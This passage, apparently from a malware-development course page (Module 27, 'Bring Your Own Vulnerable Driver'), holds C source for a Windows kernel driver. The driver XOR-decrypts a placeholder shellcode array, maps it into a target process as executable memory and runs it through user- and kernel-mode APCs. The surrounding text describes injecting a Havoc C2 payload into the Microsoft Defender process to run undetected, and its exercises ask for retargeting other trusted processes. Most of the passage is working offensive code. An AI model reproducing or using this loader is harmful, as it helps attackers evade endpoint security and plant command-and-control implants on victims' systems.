	PKAPC       	pkUserMApc		= NULL,
			        pkKernelMApc		= NULL;

	if (!pInjectedUMShellcode || !peAlertableThreadId)
		return FALSE;

	// ALlocate memory for the APCs
	if ((pkUserMApc = (PKAPC)ExAllocatePool2(POOL_FLAG_NON_PAGED, 
sizeof(KAPC), DRIVER_TAG)) == NULL) {
		DbgPrint("[!] ExAllocatePool2 [1] Failed \n");
		goto _FUNC_CLEANUP;
	}

	if ((pkKernelMApc = (PKAPC)ExAllocatePool2(POOL_FLAG_NON_PAGED, 
sizeof(KAPC), DRIVER_TAG)) == NULL) {
		DbgPrint("[!] ExAllocatePool2 [2] Failed \n");
		goto _FUNC_CLEANUP;
	}

	// Intialize the APCs
	KeInitializeApc(pkKernelMApc, peAlertableThreadId, 
OriginalApcEnvironment, (PKKERNEL_ROUTINE)KernelModeApcCallback, NULL, 
NULL, KernelMode, NULL);
	KeInitializeApc(pkUserMApc, peAlertableThreadId, 
OriginalApcEnvironment, (PKKERNEL_ROUTINE)UserModeApcCallback, NULL, 
(PKNORMAL_ROUTINE)pInjectedUMShellcode, UserMode, NULL);

	// Execute the APCs (user mode before kernel mode)
	if (!KeInsertQueueApc(pkUserMApc, NULL, NULL, FALSE)) {
		DbgPrint("[!] KeInsertQueueApc [1] Failed \n");
		goto _FUNC_CLEANUP;
	}

	if (!KeInsertQueueApc(pkKernelMApc, NULL, NULL, FALSE)) {
		DbgPrint("[!] KeInsertQueueApc [2] Failed \n");
		goto _FUNC_CLEANUP;
	}

	bSTATE = TRUE;

_FUNC_CLEANUP:
	if (!bSTATE &amp;&amp; pkUserMApc)
		ExFreePoolWithTag(pkUserMApc, DRIVER_TAG);
	if (!bSTATE &amp;&amp; pkKernelMApc)
		ExFreePoolWithTag(pkKernelMApc, DRIVER_TAG);

	return bSTATE;
}

//--------------------------------------------------------------------------------------------------------------------------------



BOOLEAN InjectPayload(IN PVOID pShellcode, IN SIZE_T sShellcodeSize) {

        BOOLEAN                 bSTATE            = FALSE;
        PETHREAD                hThread           = NULL;
        HANDLE                  hProcessId        = NULL,
                                hThreadId         = NULL,
                                hProcess          = NULL,
                                hSection          = NULL;
        NTSTATUS                STATUS            = STATUS_SUCCESS;
        OBJECT_ATTRIBUTES       ObjectAttr        = { 0x00 };
        CLIENT_ID               ClientId          = { 0x00 };
        PVOID                   pLocalAddress     = NULL,
                                pRemoteAddress    = NULL;
        SIZE_T                  sViewSize         = 0x00;


	if (!pShellcode || !sShellcodeSize)
		return FALSE;

	// Get target process ID and an alertable thread
	if (!FetchTargetProcessAndThread(&amp;hProcessId, &amp;hThread, 
&amp;hThreadId)) {
		DbgPrint("[!] FetchTargetProcessAndThread Failed \n");
		goto _FUNC_CLEANUP;
	}

	DbgPrint("[+] Found %ws's PID: %ld \n", g_TargetProcessName, 
hProcessId);
	DbgPrint("[+] Found Alertable Thread Of ID: %ld \n", hThreadId);

	// Open process handle
	InitializeObjectAttributes(&amp;ObjectAttr, NULL, OBJ_KERNEL_HANDLE, 
NULL, NULL);
	ClientId.UniqueProcess = hProcessId;
	ClientId.UniqueThread = NULL;

	if (!NT_SUCCESS((STATUS = ZwOpenProcess(&amp;hProcess, 
PROCESS_ALL_ACCESS, &amp;ObjectAttr, &amp;ClientId)))) {
		DbgPrint("[!] ZwOpenProcess Failed With Error: 0x%0.8X \n", STATUS);
		goto _FUNC_CLEANUP;
	}

	DbgPrint("[+] Opened A Handle To %ws: 0x%0.8X \n", g_TargetProcessName,
 hProcess);

	// Create a RWX section 
	if (!CreateSharedSection(sShellcodeSize, &amp;hSection) || hSection == 
NULL) {
		goto _FUNC_CLEANUP;
	}

	// Map the section to kernel memory
	if (!NT_SUCCESS((STATUS = ZwMapViewOfSection(hSection, 
NtCurrentProcess(), &amp;pLocalAddress, 0x00, 0x00, NULL, 
&amp;sViewSize, ViewUnmap, 0x00, PAGE_READWRITE)))) {
		DbgPrint("[!] ZwMapViewOfSection [1] Failed With Error: 0x%0.8X \n", 
STATUS);
		goto _FUNC_CLEANUP;
	}

	DbgPrint("[+] Allocated Local RW Memory: 0x%p \n", pLocalAddress);

	// Copy payload to kernel memory
	RtlCopyMemory(pLocalAddress, pShellcode, sShellcodeSize);

	DbgPrint("[+] Copied Payload To Local Memory\n");

	// Map the payload to the user-mode process
	if (!NT_SUCCESS((STATUS = ZwMapViewOfSection(hSection, hProcess, 
&amp;pRemoteAddress, 0x00, 0x00, NULL, &amp;sViewSize, ViewShare, 0x00, 
PAGE_EXECUTE_READWRITE)))) {
		DbgPrint("[!] ZwMapViewOfSection [2] Failed With Error: 0x%0.8X \n", 
STATUS);
		goto _FUNC_CLEANUP;
	}

	DbgPrint("[+] Allocated Remote RWX Memory In %ws At: 0x%p \n", 
g_TargetProcessName, pRemoteAddress);

	// Execute the payload
	if (!ExecuteShellcode(pRemoteAddress, hThread)) {
		DbgPrint("[!] ExecuteShellcode Failed \n");
		goto _FUNC_CLEANUP;
	}

	DbgPrint("[+] Payload Executed Successfully! \n");

	bSTATE = TRUE;

_FUNC_CLEANUP:
	if (!bSTATE &amp;&amp; pLocalAddress)
		ZwUnmapViewOfSection(NtCurrentProcess(), pLocalAddress);
	if (!bSTATE &amp;&amp; pRemoteAddress)
		ZwUnmapViewOfSection(hProcess, pRemoteAddress);
	if (hSection)
		ZwClose(hSection);
	if (hProcess)
		ZwClose(hProcess);
	if (hThread)
		ObDereferenceObject(hThread);
	return bSTATE;
}

//--------------------------------------------------------------------------------------------------------------------------------

// Encrypted payload to execute inside the target user-mode process

unsigned char Encrypted[] = { 0x90, 0x90, 0x90 };

//--------------------------------------------------------------------------------------------------------------------------------


NTSTATUS LdrDriverEntry(IN PDRIVER_OBJECT pDriverObject, IN 
PUNICODE_STRING pRegistryPath) {
	UNREFERENCED_PARAMETER(pDriverObject);
	UNREFERENCED_PARAMETER(pRegistryPath);

	DbgPrint("[+] Driver Loaded Successfully \n");

	// Decrypting the payload
	for (SIZE_T i = 0; i &lt; sizeof(Encrypted); i++) {

		if ((i + 2) % 16 == 0)
			Encrypted[i] = Encrypted[i] ^ 0x3C;
		if (i % 2 == 0)
			Encrypted[i] = Encrypted[i] ^ 0x85;
		else
			Encrypted[i] = Encrypted[i] ^ 0x2A;

	}

	InjectPayload((PVOID)Encrypted, (SIZE_T)sizeof(Encrypted));

	DbgPrint("[*] DONE!\n");

	return STATUS_SUCCESS;
}
</code></pre>
<p><code>KernelLdr.sys</code> was based on the following publicly available repositories:</p>
<ul>
<li>
<p><a href="https://github.com/danielkrupinski/KernelProcessList">KernelProcessList</a> - Example Windows Kernel-mode Driver which enumerates running processes.</p>
</li>
<li>
<p><a href="https://github.com/adrianyy/KeInject">KeInject</a> - Kernel LdrLoadDll injector.</p>
</li>
<li>
<p><a href="https://github.com/Idov31/Nidhogg">Nidhogg</a> - All-in-one simple to use rootkit for red teams.</p>
</li>
</ul>
<h3>Demo</h3>
<p>The below image shows <em>KernelLdr.sys</em> injecting a Havoc demon payload into <code>MsMpEng.exe</code> where it's executed undetectably.</p>
<img width="1400px" alt="image" style="margin:auto" src="27_files/byovd-663510502-b38b2bbc-b94b-4446-9790-d78c2fee70b2.png">
<h3>Video Demo</h3>
<video style="margin:auto" width="1400" controls="controls">
  <source src="27_files/BYOVD-Demo.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>
<h3>Conclusion</h3>
<p>As we've discussed in this module, the BYOVD approach can be 
extremely powerful, especially when the vulnerable driver is exploited 
to write to kernel memory. This capability allows us to map unsigned 
drivers. As demonstrated earlier, injecting your command and control 
payload into an AV/EDR process can be a very effective technique for 
memory manipulation. This is particularly advantageous because these 
security solutions often overlook themselves.</p>
<p>The code shared in this module includes an updated version of the 
kdmapper project, a precompiled "HelloWorld" driver along with its 
source code, the payload encryption project, and the KernelLdr project. 
Additionally, you'll find the vulnerable driver <code>IQVW64.sys</code>, although it's worth noting that the driver file is not required to execute the BYOVD attack.</p>

    </div>

    
        
</div>              </div>
              
              <div id="accessory-container" class="flex flex-col h-full lg:min-w-[500px] w-[500px]">
    <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-full">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                                    <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Modify the code to inject into a different trusted process (e.g. NisSrv.exe)</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Use RC4 or AES instead of XOR in kdmapper</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-2" data-objective-id="2" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">OPTIONAL: Find a different driver to exploit</label>
                </div>
                                              
    </div>
    <div id="toc-container" class=" p-4 border-r border-b border-gray-600 w-full h-full">
    <div class="sticky top-0 bg-gray-800 rounded-xl">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg rounded-t-xl">
        Table of Contents
        </div>

        
        <div id="toc-skeleton" class="min-h-[70vh] max-h-[70vh] overflow-y-auto rounded-b-xl pr-2 ml-8 animate-pulse space-y-2">
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        </div>

        
        <div id="toc-content" class="min-h-[70vh] max-h-[70vh] overflow-y-auto rounded-b-xl pr-2">
        
        </div>
    </div>
    </div>

        <script>
    // If ToC starts open, build it once the DOM is ready
    document.addEventListener('DOMContentLoaded', function () {
        var el = document.getElementById('toc-content');
        if (el && !el.innerHTML.trim() && typeof extractHeadings === 'function') {
        extractHeadings();
        }
    });
    </script>
    
    <div id="maldevDB" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-full">
        <img class="w-[500px] mb-4" src="27_files/maldev-db-logo.png">
        <form id="searchForm" class="flex flex-col items-center justify-center w-full font-mono">
            <div class="relative flex w-full border border-solid border-gray-700 rounded-3xl">
            <i class="absolute fa fa-search text-gray-400 top-[14px] left-4 z-20"></i>
            <input placeholder="Search Maldev Database" type="search" name="q" autocomplete="off" id="searchInput" maxlength="85" class="relative m-0 -mr-0.5 h-[46px] w-full rounded-l-3xl  bg-transparent px-10 py-[0.25rem] font-normal leading-[1.6] text-white outline-none focus:bg-gray-800 focus:border-r focus:border-gray-700" aria-label="Search">
                <button class=" w-[70px] bg-gray-800 flex items-center justify-center rounded-r-3xl px-6 py-2.5 text-white hover:bg-gray-700" type="submit">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="h-5 w-5">
                    <path fill-rule="evenodd" d="M9 3.5a5.5 5.5 0 100 11 5.5 5.5 0 000-11zM2 9a7 7 0 1112.452 4.391l3.328 3.329a.75.75 0 11-1.06 1.06l-3.329-3.328A7 7 0 012 9z" clip-rule="evenodd"></path>
                    </svg>
                </button>
            </div>
            <div class="relative inline-block text-sm w-full md:w-fit">
                <select id="languageSelect" name="language" class="border rounded-md p-2.5 bg-gray-800 border-gray-600 placeholder-gray-400 text-white outline-none appearance-none w-full pr-8 my-4">
                    <option value="all" selected="selected">All languages</option>
                    <option value="c">C</option>
                    <option value="cpp">C++</option>
                    <option value="python">Python</option>
                    <option value="nim">Nim</option>
                    <option value="rust">Rust</option>
                    
                </select>
                <div class="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
                    <svg class="h-4 w-4 text-gray-700" fill="#fff" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
                        <path d="M5.516 7.548c.436-.446 1.045-.481 1.576 0L10 10.405l2.908-2.857c.531-.481 1.141-.446 1.576 0 .436.445.408 1.197 0 1.643l-3.564 3.642c-.214.223-.502.335-.92.335s-.707-.112-.92-.335l-3.564-3.642c-.408-.446-.436-1.198 0-1.643z"></path>
                    </svg>
                </div>
            </div>
        </form>
        <div class="resultsWrapper">
            <div id="noResults" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    No results found.
                </div>
            </div>
            <div id="rateLimited" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    HTTP 429 - You have been rate limited.
                </div>
            </div>

            <!-- Results here -->

            <div class="flex justify-center mt-6">
                <button id="loadMore" class="hidden bg-blue-700 text-white px-4 py-2 rounded hover:bg-blue-600 font-mono text-sm">
                    Load More
                </button>
            </div>
        </div>
    </div>
</div>
<div id="progress-container" class="hidden flex-col lg:min-w-[500px]">
    <div id="progress" class="p-4 border-r overflow-auto border-b border-gray-600 font-code w-full min-h-full">
    <div class="max-h-[300px]">
                <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">New Modules Progress</div>
                                    <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-1" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./1.html&amp;toc=true">
                    <div for="module-1" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 1 - Binary Metadata Modification
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-2" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./2.html&amp;toc=true">
                    <div for="module-2" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 2 - Thread Enumeration - NtQuerySystemInformation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-3" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./3.html&amp;toc=true">
                    <div for="module-3" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 3 - Custom WinAPI Functions
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-4" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./4.html&amp;toc=true">
                    <div for="module-4" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 4 - Exploiting EDRs For Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-5" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./5.html&amp;toc=true">
                    <div for="module-5" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 5 - Introduction To MASM Assembly
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-6" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./6.html&amp;toc=true">
                    <div for="module-6" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 6 - Evasion With File Bloating
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-7" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./7.html&amp;toc=true">
                    <div for="module-7" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 7 - Bring Your Own Protocol Handler
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-8" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./8.html&amp;toc=true">
                    <div for="module-8" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 8 - Bring Your Own File Extension
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-9" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./9.html&amp;toc=true">
                    <div for="module-9" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 9 - Utilizing Hardware Breakpoints For Hooking (1)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-10" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./10.html&amp;toc=true">
                    <div for="module-10" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 10 - Utilizing Hardware Breakpoints For Hooking (2)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-11" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./11.html&amp;toc=true">
                    <div for="module-11" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 11 - Utilizing Hardware Breakpoints For Credential Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-12" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./12.html&amp;toc=true">
                    <div for="module-12" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 12 - Event Tracing For Windows - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-13" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./13.html&amp;toc=true">
                    <div for="module-13" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 13 - Event Tracing For Windows - ETW Tools
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-14" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./14.html&amp;toc=true">
                    <div for="module-14" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 14 - Event Tracing For Windows - ETW Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-15" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./15.html&amp;toc=true">
                    <div for="module-15" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 15 - Event Tracing for Windows - Improved Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-16" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./16.html&amp;toc=true">
                    <div for="module-16" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 16 - Event Tracing for Windows - Patchless ETW Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-17" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./17.html&amp;toc=true">
                    <div for="module-17" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 17 - Event Tracing For Windows - ETW Provider Session Hijacking
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-18" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./18.html&amp;toc=true">
                    <div for="module-18" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 18 - Antimalware Scan Interface - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-19" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./19.html&amp;toc=true">
                    <div for="module-19" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 19 - Antimalware Scan Interface - AMSI Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-20" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./20.html&amp;toc=true">
                    <div for="module-20" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 20 - Antimalware Scan Interface - AMSI Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-21" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./21.html&amp;toc=true">
                    <div for="module-21" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 21 - Building a DRM-equipped Malware
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-22" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./22.html&amp;toc=true">
                    <div for="module-22" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 22 - Introduction to Havoc C&amp;C
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-23" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./23.html&amp;toc=true">
                    <div for="module-23" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 23 - Building An Evasive DLL Payload Loader
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-24" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./24.html&amp;toc=true">
                    <div for="module-24" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 24 - Introduction To DLL Sideloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-25" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./25.html&amp;toc=true">
                    <div for="module-25" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 25 - Practical DLL Sideloading Example
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-26" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./26.html&amp;toc=true">
                    <div for="module-26" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 26 - DLL Sideloading For EDR Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-27" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./27.html&amp;toc=true">
                    <div for="module-27" class="ml-2 text-sm font-medium 
                                bg-blue-700 font-bold rounded-sm">
                        Module 27 - Bring Your Own Vulnerable Driver
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-28" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./28.html&amp;toc=true">
                    <div for="module-28" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 28 - Local PE Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-29" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./29.html&amp;toc=true">
                    <div for="module-29" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 29 - Reflective DLL Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-30" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./30.html&amp;toc=true">
                    <div for="module-30" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 30 - PeFluctuation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-31" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./31.html&amp;toc=true">
                    <div for="module-31" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 31 - Building a PE Packer
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-32" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./32.html&amp;toc=true">
                    <div for="module-32" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 32 - Malware Directory Placement
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-33" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./33.html&amp;toc=true">
                    <div for="module-33" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 33 - Utilizing Fibers For Payload Execution
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-34" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./34.html&amp;toc=true">
                    <div for="module-34" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 34 - TLS Callbacks For Anti-Debugging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-35" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./35.html&amp;toc=true">
                    <div for="module-35" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 35 - Threadless Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-36" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./36.html&amp;toc=true">
                    <div for="module-36" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 36 - Module Stomping
                    </div>
                </a>
            </div>
